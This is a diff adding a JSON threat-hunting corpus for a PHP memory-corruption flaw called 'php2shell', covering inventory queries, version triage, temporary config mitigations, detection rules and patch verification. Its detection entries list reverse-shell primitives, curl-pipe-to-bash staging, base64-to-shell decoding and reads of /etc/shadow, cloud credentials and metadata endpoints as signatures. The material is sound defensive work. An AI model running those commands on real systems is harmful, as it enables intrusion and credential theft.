@@ -1,0 +1,176 @@
+{
+  "corpus": "P2S",
+  "organ": "php2shell-forensics",
+  "vuln_class": "php_core_memory_safety_compromise_assessment",
+  "corpus_version": "1.0.0",
+  "house_rules": [
+    "Patch-first law: the PHP security update (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35, or a verified vendor backport) is the only complete remediation on record - every configuration action in this corpus is exposure reduction for named attack paths and every report says so.",
+    "Crash-discipline law: OOM-triggering multipart probes crash PHP workers - they are an operator decision under explicit authorization, never an agent default; this corpus hunts with passive signals and existing telemetry first (the prototype organ's no-DoS doctrine applied to a memory-safety event).",
+    "No exploit reproduction: building or firing a php2shell chain against any host requires an operator order that names the PHP layer in scope; the organ's default work is exposure inventory, passive detection, and compromise forensics.",
+    "Credential law: disclosed worker memory and harvested credential material are masked at first 8 chars in context; full values live only in engagements/ artifacts.",
+    "Read-only forensics: planted scripts are read and analyzed, never executed; staging and reverse-shell primitives appear here as detection signatures, never as runnable kit.",
+    "Probes below are canonical forms transcribed from the public record (Wiz Research, Elastic Security Labs, Huntress, the php-src advisories), attributed per entry; every growth bumps corpus_version with the entries delta on record."
+  ],
+  "entries": [
+    {
+      "id": "P2S-001",
+      "technique": "PHP install inventory via process telemetry (ECS query)",
+      "prerequisites": [
+        "an ECS-capable data view with process events (e.g. logs-endpoint.events.process-*)",
+        "a retention window covering the assessment period (the published example searches the last 7 days)"
+      ],
+      "probe": "event.category: process and (process.name: (php* or lsphp* or frankenphp or sw-engine-fpm) or process.parent.name: (php* or lsphp* or frankenphp or sw-engine-fpm))",
+      "oracle": "the host set running any PHP runtime - including Windows php.exe/php-cgi.exe forms and vendor-bundled runtimes visible through parent-process matches; each host becomes one inventory FACT row with process.executable and container.id where available",
+      "failure_modes": [
+        "inactive installations never appear in process telemetry - the record's own caveat: missing results do not establish that PHP is absent; follow with the on-disk inventory (P2S-002)",
+        "container filesystems are inspected separately - host-level queries miss them",
+        "rarely-invoked runtimes (cron-only php-cli) can fall outside the retention window; widen the window or fall to package queries"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs",
+        "title": "php2shell: Assessing Elastic detection coverage relevant to CVE-2026-109618 and CVE-2026-109619 (find PHP through process telemetry)",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    },
+    {
+      "id": "P2S-002",
+      "technique": "version and SAPI exposure triage against the fixed-version set",
+      "prerequisites": [
+        "host or package-manager read access for the inventory query",
+        "the fixed-version set on record: 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (anything older on a served branch is exposed; 8.1 and older are end-of-life)"
+      ],
+      "probe": "SELECT name, version, arch, status FROM deb_packages WHERE status = 'install ok installed' AND (name LIKE 'php%' OR name LIKE 'libapache2-mod-php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine') ORDER BY name; (the rpm_packages twin on the same record)",
+      "oracle": "a version map per host against the fixed set, plus the SAPI row (PHP-FPM / Apache mod_php / php-cgi / FrankenPHP / LiteSpeed) - mod_php flags highest risk: an unauthenticated request can trigger the flaw before any application code runs (the PHP team's own risk ordering)",
+      "failure_modes": [
+        "source-built PHP lives outside the package manager - take the version from the runtime directly or the SAPI's response signature instead",
+        "rpms.remirepo.net packages did not carry the fix on release day (the Huntress record's caveat) - treat remirepo-hosted installs as exposed until verified against the vendor advisory",
+        "distribution backports keep the old version string while carrying the fix - compare against the vendor advisory, not the raw string (the version-string trap)"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs (package queries) + Huntress (vendor-lag caveats)",
+        "title": "php2shell: Assessing Elastic detection coverage; Rapid Response: php2shell, Leaked Critical PHP Vulnerabilities",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    },
+    {
+      "id": "P2S-003",
+      "technique": "exposure-reduction configuration (temporary, never a fix)",
+      "prerequisites": [
+        "an operator-approved change window",
+        "php.ini / FPM pool / Apache config control - the directives must take effect before request parsing; ini_set() and .user.ini do not help (the record's own boundary)"
+      ],
+      "probe": "for the OOM path (CVE-2026-109618): memory_limit=-1 set where applications cannot override (php_admin_value in the FPM pool or Apache config), post_max_size kept low, a container/cgroup limit enforced rather than RLIMIT_AS or RLIMIT_DATA; for the stale-global path (CVE-2026-109619): session.upload_progress.enabled=0 plus a restart of every worker, and on PHP 8.5 fatal_error_backtraces=0",
+      "oracle": "each directive verified effective at the pre-parse layer (loaded configuration, not runtime), with the report stating these are exposure reduction for the named attack paths only - the PHP team's own position on record: no complete mitigation exists and updating is the only safe choice",
+      "failure_modes": [
+        "treating any single toggle as complete - the record explicitly warns against guidance that presents one config change as a full solution",
+        "workers not restarted - disabling session upload progress requires restarting every worker to take effect; a config edit alone is theater",
+        "memory_limit=-1 removes the OOM abort but widens unbounded-allocation exposure elsewhere - the tradeoff is on record and is the operator's call, never the agent's default"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs (quoting the PHP security advisory's mitigation section) + Huntress (end-of-life guidance)",
+        "title": "php2shell: Is there a php.ini mitigation for php2shell?; Rapid Response update",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    },
+    {
+      "id": "P2S-004",
+      "technique": "remote memory disclosure detection - the response-cookie oracle (passive)",
+      "prerequisites": [
+        "access to web-server and PHP-FPM error logs plus response capture for the in-scope hosts",
+        "the four published signals on watch: unusual multipart requests followed by memory-limit errors or repeated HTTP 500 responses, unexpectedly large or malformed PHPSESSID response cookies, unexplained PHP worker churn"
+      ],
+      "probe": "passive watch (no crafted requests): alert on the four-signal quad above; on a hit, capture the response set - the malformed PHPSESSID response cookie is the evidence carrier (URL-encoded heap contents published by a request the worker survived)",
+      "oracle": "a PHPSESSID response cookie carrying URL-encoded worker-heap contents is the disclosure verdict - an attacker-sized region of live worker memory, including data from outside the attacker's request, disclosed even when the application never calls session_start() (the record's application-agnostic property); credential material inside leaked bytes follows the masking law",
+      "failure_modes": [
+        "these bugs execute below the application layer - application logs may contain little context (the record's own warning); the watch rides web-server and PHP-FPM logs instead",
+        "worker pools churn for operational reasons too - pair churn with the multipart/500 signals before escalating; single-signal alerts are leads",
+        "cookie size baselines vary per application - baseline the normal PHPSESSID shape first, then flag the outlier; malformed beats merely large"
+      ],
+      "source": {
+        "credit": "Wiz Research",
+        "title": "PHP2Shell: AI uncovers critical RCE vulnerabilities affecting 70% of the Internet (defender guidance + the remote process-memory disclosure bug)",
+        "url": "https://www.wiz.io/blog/php2shell-php-rce"
+      }
+    },
+    {
+      "id": "P2S-005",
+      "technique": "behavioral detection - web-server parent spawns a shell (convergent rule)",
+      "prerequisites": [
+        "process telemetry with parent lineage (EDR endpoint events or auditd)",
+        "the convergent law on record: detect the outcome, not the trigger - a PHP RCE ends in a request-serving process doing what a request-serving process should not do"
+      ],
+      "probe": "process where event.type == \"start\" and event.action == \"exec\" and process.parent.interactive == false and (process.parent.name in (\"apache2\", \"httpd\", \"nginx\", \"php-cgi\") or process.parent.name like (\"php-fpm*\", \"lsphp*\")) and process.name in (\"bash\", \"dash\", \"sh\", \"zsh\", \"ksh\") and process.args in (\"-c\", \"-cl\", \"-lc\") and (process.command_line like~ (\"*/dev/tcp*\", \"*|*base64 -d*\", \"*curl*\", \"*wget*\", \"*/etc/shadow*\") or process.args in (\"id\", \"whoami\", \"hostname\")) (transcribed from the published endpoint rule; the wp2shell precedent run ended in sh -c -- id; whoami; hostname)",
+      "oracle": "a non-interactive web-server parent launching a shell with a high-risk command line - the tightest signal that code execution just succeeded regardless of which vulnerability opened the door; on hosts without endpoint detection, process-watcher in observe mode is the free stand-in",
+      "failure_modes": [
+        "SIEM-only deployments alert but do not terminate - prevention rides the endpoint layer; state which layer fired",
+        "fileless variants (account creation, in-memory staging) can slip the shell-spawn rule - the record's own honesty note; the child-process and file-creation layers (P2S-007) are the second net",
+        "legitimate control panels schedule through the web stack - new_terms baselining (which command lines each parent normally runs) separates routine from fresh"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs (endpoint rule predicate) + Huntress (process-watcher and the PHP child-process observation)",
+        "title": "php2shell: Process execution - the web server spawns a shell; Rapid Response (what exploitation will probably look like)",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    },
+    {
+      "id": "P2S-006",
+      "technique": "post-exploitation flow detection (the convergent sequence, passive log sweep)",
+      "prerequisites": [
+        "web-server access logs, PHP logs, and process events for the sweep window",
+        "the MITRE mapping on record: T1190 (Exploit Public-Facing Application) at entry, T1059 (Command and Scripting Interpreter) and T1505.003 (Server Software Component: Web Shell) after execution"
+      ],
+      "probe": "sweep logs for the published convergent sequence: access-proof commands (id, whoami, uname -a, hostname, cat /etc/os-release) -> escalation enumeration (sudo -l, find / -perm -u=s -type f, getcap -r /, reads of /etc/passwd and /etc/shadow) -> interpreter staging (python3 -c, perl -e, ruby -e, node -e, php -r) -> second-stage retrieval (curl -O, wget -O, curl http(s)://... | bash, wget -qO- http(s)://... | sh) -> inline decode (echo <b64> | base64 -d | sh, openssl enc -d, xxd -r) -> reverse-shell primitives (bash -i >& /dev/tcp/<ip>/<port> 0>&1, mkfifo with nc, socat, python pty.spawn, php fsockopen) -> credential harvest (.env, ~/.aws/credentials, /var/run/secrets/kubernetes.io/ service-account tokens, 169.254.169.254)",
+      "oracle": "the sequence plus web-context parentage ties the actions to a compromised PHP worker - each step alone can be benign operations; the PARENT LINEAGE and the ordering are the discriminators; a confirmed flow hands off to adversary-tracker's Binary Brain (event-triggered branch) for the hypothesis hunt",
+      "failure_modes": [
+        "each command is individually legitimate - never alert on a single command without the parentage join; the record builds detection on the convergent flow precisely because no exploit string exists",
+        "coverage gaps remain on record (account creation, fileless execution paths) - state the uncovered classes in the report instead of claiming the sweep is complete",
+        "credential-harvest reads are impact-bearing evidence: mask secrets at first 8 chars, artifacts under engagements/"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs (the post-exploitation flow catalog)",
+        "title": "php2shell: The php2shell post-exploitation flow - what a compromised web server does next",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    },
+    {
+      "id": "P2S-007",
+      "technique": "planted-script drop detection in the web root",
+      "prerequisites": [
+        "file-event telemetry (creation and rename) with the parent process recorded",
+        "a web-root path inventory per in-scope host"
+      ],
+      "probe": "watch for: new executable or script content (.php / .phtml) written into the web root by a web-server parent outside deployment windows; double-extension forms such as avatar.php.jpg slipping upload validation; high-entropy content written with a web-executable extension (the encoded-payload signature)",
+      "oracle": "a web-server process writing new executable content into the web root is abnormal outside a deployment - the planted-script verdict; the dropped file is read forensically and never executed; polyglot-disguised files get format analysis before any verdict is written",
+      "failure_modes": [
+        "legitimate deploys create the same event shape - new_terms baselining (which files this parent normally touches) separates routine from planted",
+        "staged files can land outside the web root first (/tmp, /dev/shm, /var/tmp - the suspicious-path list on the same record) - sweep those paths as part of the flow",
+        "a double extension alone is not a verdict - upload-validation bypass is the hypothesis; content analysis is the proof"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs (file-creation rule family)",
+        "title": "php2shell: File creation - the PHP webshell drop (rule family incl. File with High Entropy Created by Web Server)",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    },
+    {
+      "id": "P2S-008",
+      "technique": "patch verification and the honest close-out",
+      "prerequisites": [
+        "the version map from P2S-002",
+        "the disclosure timeline on record: details leaked 2026-10-20 ahead of embargo; emergency release and public disclosure 2026-10-21"
+      ],
+      "probe": "per host: confirm the runtime sits in the fixed set (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35) or carries a verified vendor backport; for source builds the PHP team's patch commit 31c0ea7d7ff1d1fccb6492e52dab544011628065 is the lineage to verify; end-of-life branches (8.1 and older) get the minimal source backports (7.4 / 8.0 / 8.1) or isolation",
+      "oracle": "the report states per host: patched / backported / EOL-isolated / exposed-with-monitoring - carrying the event facts: both CVEs rated CVSS v4.0 9.2 (GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp), every PHP version of the last decade affected back to 5.4, watchTowr reproduced CVE-2026-109618, and no in-the-wild exploitation observed at disclosure (the Huntress fleet baseline)",
+      "failure_modes": [
+        "container base images lag the running containers - rebuilt images are the verification target, not just the live instances",
+        "vendor backports keep old version strings - verify against the vendor advisory (the same version-string trap as P2S-002)",
+        "EOL isolation claims need the isolation evidenced (network segment, WAF, VPN-only reach) - an unpatched internet-facing EOL host is an open finding, never a parked one"
+      ],
+      "source": {
+        "credit": "Elastic Security Labs (patch record) + Huntress (disclosure baseline) + php/php-src advisories (GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp)",
+        "title": "php2shell detection coverage; Rapid Response: php2shell; php-php-src security advisories",
+        "url": "https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection"
+      }
+    }
+  ]
+}
